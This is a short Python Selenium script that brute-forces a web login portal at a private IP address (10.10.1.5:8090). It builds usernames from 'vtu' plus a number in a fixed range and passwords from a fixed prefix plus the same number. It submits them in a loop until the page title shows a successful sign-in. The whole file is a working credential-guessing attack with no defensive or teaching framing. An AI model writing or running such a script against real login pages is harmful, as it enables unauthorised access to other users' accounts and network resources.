from selenium import webdriver
from selenium.webdriver.common.by import By
import random
import time
options = webdriver.ChromeOptions()
options.add_experimental_option("detach",True)
driver = webdriver.Chrome(options=options,executable_path="D:\python\webdrivers\chromedriver.exe")
def logbrute(user,passw):
        driver.get("http://10.10.1.5:8090/httpclient.html")
        driver.find_element(By.ID,"username").send_keys(user)
        driver.find_element(By.ID,"password").send_keys(passw)
        driver.find_element(By.ID,"loginbutton").click()
        statusmessage =driver.find_element(By.ID,"statusmessage").text
        return statusmessage
def randuser():
    lis = []
    randnum =random.randrange(19700,22000)
    user = "vtu"+str(randnum)
    passw = "9991072010"+str(randnum)
    lis =[user,passw]
    return lis

while True:
    lis = randuser()
    user = lis[0]
    passw=lis[1]
    statusmessage=logbrute(user,passw)
    tittle = driver.title
    text = "You are signed in as "+lis[0]
    if tittle == text:
        print(tittle)
        break
    else:
        time.sleep(2)
        print(tittle,text)
        
    
    

    
         
    